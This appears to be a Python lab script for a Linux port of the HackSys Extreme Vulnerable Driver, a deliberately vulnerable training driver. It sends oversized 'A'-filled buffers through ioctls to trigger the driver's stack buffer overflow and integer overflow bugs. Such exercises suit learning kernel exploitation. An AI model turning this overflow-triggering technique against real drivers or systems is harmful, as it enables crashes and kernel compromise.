import ctypes
import fcntl
import os


IOCPARM_MASK = 0x1fff
IOC_OUT = 0x40000000
IOC_IN = 0x80000000
IOC_INOUT = IOC_IN | IOC_OUT


def _IOC(inout, group, number, len):
    return (inout | ((len & IOCPARM_MASK) << 16) | ((group) << 8) | (number))

def _IOWR(group, number, type):
    return _IOC(IOC_INOUT, ord(group), number, ctypes.sizeof(type))


class HEVD_IO(ctypes.Structure):
    _fields_ = [
        ("input_buffer", ctypes.c_void_p),
        ("input_buffer_length", ctypes.c_size_t),
        ("output_buffer", ctypes.c_void_p),
        ("output_buffer_length", ctypes.c_size_t),
    ]


def IOCTL(number):
    return _IOWR('h', number, HEVD_IO)


DEVICE_PATH = "/dev/HackSysExtremeVulnerableDriver"

# IOCTL codes
HEVD_IOCTL_BUFFER_OVERFLOW_STACK = IOCTL(0)
# HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS = IOCTL(1)
# HEVD_IOCTL_ARBITRARY_WRITE = IOCTL(2)
# HEVD_IOCTL_BUFFER_OVERFLOW_KERNEL_HEAP = IOCTL(3)
# HEVD_IOCTL_ALLOCATE_UAF_OBJECT_KERNEL_HEAP = IOCTL(4)
# HEVD_IOCTL_USE_UAF_OBJECT_KERNEL_HEAP = IOCTL(5)
# HEVD_IOCTL_FREE_UAF_OBJECT_KERNEL_HEAP = IOCTL(6)
# HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_KERNEL_HEAP = IOCTL(7)
# HEVD_IOCTL_TYPE_CONFUSION = IOCTL(8)
HEVD_IOCTL_INTEGER_OVERFLOW = IOCTL(9)
# HEVD_IOCTL_NULL_POINTER_DEREFERENCE = IOCTL(0xA)
# HEVD_IOCTL_UNINITIALIZED_MEMORY_STACK = IOCTL(0xB)
# HEVD_IOCTL_UNINITIALIZED_MEMORY_KERNEL_HEAP = IOCTL(0xC)
# HEVD_IOCTL_DOUBLE_FETCH = IOCTL(0xD)


def trigger_ioctl(ioctl, hevd_io):
    device_fd = os.open(DEVICE_PATH, os.O_RDWR)

    try:
        status = fcntl.ioctl(device_fd, ioctl, hevd_io)
    except Exception as exc:
        print(f"💥 Exception in IOCTL: {exc}")
        return

    if status == 0:
        print("✅ IOCTL executed successfully!")
    else:
        print(f"❌ Failed to execute IOCTL. Status code: {status}")

    os.close(device_fd)


if __name__ == "__main__":
    print(f"🏆 HackSys Extreme Vulnerable Driver (HEVD) - Linux 🏆")

    # Tests for each IOCTL
    print()
    print(f"🚀 Triggering: HEVD_IOCTL_BUFFER_OVERFLOW_STACK - 0x{HEVD_IOCTL_BUFFER_OVERFLOW_STACK:X}")

    input_buffer_size = 0x1000
    input_buffer_data = b"A" * input_buffer_size
    input_buffer = ctypes.create_string_buffer(input_buffer_data)

    user_hevd_io = HEVD_IO()
    user_hevd_io.input_buffer = ctypes.cast(input_buffer, ctypes.c_void_p)
    user_hevd_io.input_buffer_length = len(input_buffer_data)

    print(f"\t🔵 Input buffer: 0x{ctypes.addressof(input_buffer):X}")
    print(f"\t🔵 Input buffer length: 0x{input_buffer_size:X}")

    trigger_ioctl(HEVD_IOCTL_BUFFER_OVERFLOW_STACK, user_hevd_io)

    print()
    print(f"🚀 Triggering: HEVD_IOCTL_INTEGER_OVERFLOW - 0x{HEVD_IOCTL_INTEGER_OVERFLOW:X}")

    input_buffer_size = 0x800
    input_buffer_data = b"A" * input_buffer_size
    input_buffer = ctypes.create_string_buffer(input_buffer_data)

    user_hevd_io = HEVD_IO()
    user_hevd_io.input_buffer = ctypes.cast(input_buffer, ctypes.c_void_p)
    user_hevd_io.input_buffer_length = len(input_buffer_data)

    print(f"\t🔵 Input buffer: 0x{ctypes.addressof(input_buffer):X}")
    print(f"\t🔵 Input buffer length: 0x{input_buffer_size:X}")

    trigger_ioctl(HEVD_IOCTL_INTEGER_OVERFLOW, user_hevd_io)
